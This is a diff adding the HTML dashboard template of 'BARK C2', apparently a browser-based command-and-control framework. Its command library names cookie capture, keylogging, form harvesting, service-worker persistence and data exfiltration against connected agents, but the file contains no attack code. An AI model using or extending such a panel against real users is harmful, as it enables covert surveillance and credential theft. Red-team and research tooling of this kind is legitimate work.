@@ -1,0 +1,178 @@
+{{ define "dashboard" }}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BARK C2 Agent Dashboard</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;700&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="/static/css/neon.css">
+    <link rel="stylesheet" href="/static/css/dashboard.css">
+</head>
+<body>
+    <div class="container-fluid">
+        <header class="dashboard-header">
+            <div class="logo">
+                <h2>BARK <span class="title-accent">C2</span></h2>
+            </div>
+            <div class="agent-info">
+                <span class="cyber-status online" id="agent-status">ONLINE</span>
+                <span class="agent-id" id="agent-id">{{ .agent.Name }}</span>
+                <span class="last-seen" id="last-seen">Last seen: TODO</span>
+            </div>
+            <div class="nav-controls">
+                <button id="back-to-main" href="/" class="btn btn-small">
+                    <i class="fas fa-arrow-left btn-icon"></i> Back
+                </button>
+                <button id="refresh-agent" class="btn btn-small">
+                    <i class="fas fa-sync btn-icon"></i> Refresh
+                </button>
+            </div>
+        </header>
+        
+        <div class="dashboard-grid">
+            <!-- Agent Details Panel -->
+            <div class="panel agent-details">
+                <div class="panel-header">
+                    <h3>Agent Details</h3>
+                </div>
+                <div class="panel-content">
+                    <div class="detail-item">
+                        <div class="detail-label">ID:</div>
+                        <div class="detail-value" id="detail-id">{{ .agent.Name }}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Source IP:</div>
+                        <div class="detail-value" id="detail-ip">{{ .agent.SourceIP }}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">Type:</div>
+                        <div class="detail-value" id="detail-type">{{ if .agent.IsStager }}Stager{{ else }}Full Agent{{ end }}</div>
+                    </div>
+                    <div class="detail-item">
+                        <div class="detail-label">First Seen:</div>
+                        <div class="detail-value" id="detail-created">{{ .agent.CreatedAt.Format "Jan 02, 2006 15:04:05" }}</div>
+                    </div>
+                    
+                    <div class="cyberpunk-divider"></div>
+                    
+                    <div class="system-info" id="system-info">
+                        <!-- This will be populated with parsed system info -->
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Command Console Panel -->
+            <div class="panel command-console">
+
+                <div class="panel-header">
+                    <h3>Command Console</h3>
+                    <div class="panel-actions">
+                        <button id="clear-all-commands" class="btn btn-small danger">
+                            <span class="btn-icon">⚠️</span> Clear All Commands
+                        </button>
+                    </div>
+                </div>
+                <div class="panel-content">
+                    <div class="console-output" id="console-output">
+                        <div class="console-line system-message">
+                            <span class="timestamp">TODO</span>
+                            <span class="message-content">Connection established to agent {{ .agent.Name }}</span>
+                        </div>
+                        <div class="console-line system-message">
+                            <span class="timestamp">{{ .now.Format "15:04:05" }}</span>
+                            <span class="message-content">Type a command below and press Enter or select a command from the Command Library</span>
+                        </div>
+                    </div>
+                    <div class="console-input-container">
+                        <span class="console-prompt">></span>
+                        <input type="text" id="command-input" class="console-input" placeholder="Enter command..." autofocus>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Command Library Panel -->
+            <div class="panel command-library">
+                <div class="panel-header">
+                    <h3>Command Library</h3>
+                </div>
+                <div class="panel-content">
+                    <div class="command-category">
+                        <div class="category-header">Reconnaissance</div>
+                        <div class="command-list">
+                            <div class="command-item" data-command="collect_browser_info">Collect Browser Info</div>
+                            <div class="command-item" data-command="scan_local_network">Scan Local Network</div>
+                            <div class="command-item" data-command="capture_cookies">Capture Cookies</div>
+                        </div>
+                    </div>
+                    
+                    <div class="command-category">
+                        <div class="category-header">Persistence</div>
+                        <div class="command-list">
+                            <div class="command-item" data-command="install_service_worker">Install Service Worker</div>
+                            <div class="command-item" data-command="create_local_storage">Create Local Storage</div>
+                            <div class="command-item" data-command="upgrade_agent">Upgrade Agent</div>
+                        </div>
+                    </div>
+                    
+                    <div class="command-category">
+                        <div class="category-header">Data Collection</div>
+                        <div class="command-list">
+                            <div class="command-item" data-command="take_screenshot">Take Screenshot</div>
+                            <div class="command-item" data-command="keylogger_start">Start Keylogger</div>
+                            <div class="command-item" data-command="form_harvester">Form Harvester</div>
+                        </div>
+                    </div>
+                    
+                    <div class="command-category">
+                        <div class="category-header">Control</div>
+                        <div class="command-list">
+                            <div class="command-item" data-command="sleep 10">Sleep (10s)</div>
+                            <div class="command-item" data-command="terminate">Terminate Agent</div>
+                            <div class="command-item" data-command="exfiltrate_data">Exfiltrate Data</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Activity Log Panel -->
+            <div class="panel activity-log">
+                <div class="panel-header">
+                    <h3>Activity Log</h3>
+                    <button id="clear-log" class="btn btn-small">
+                        <i class="fas fa-trash btn-icon"></i> Clear
+                    </button>
+                </div>
+                <div class="panel-content">
+                    <table class="neon-table">
+                        <thead>
+                            <tr>
+                                <th width="20%">Timestamp</th>
+                                <th width="20%">Type</th>
+                                <th width="60%">Activity</th>
+                            </tr>
+                        </thead>
+                        <tbody id="activity-table-body">
+                            <tr>
+                                <td>TODO</td>
+                                <td><span class="activity-type connection">CONNECTION</span></td>
+                                <td>Agent dashboard opened</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/static/js/dashboard.js"></script>
+    <script>
+        // Initialize dashboard with agent ID
+        document.addEventListener('DOMContentLoaded', function() {
+            initDashboard('{{ .agent.Name }}');
+        });
+    </script>
+</body>
+</html>
+{{ end }}
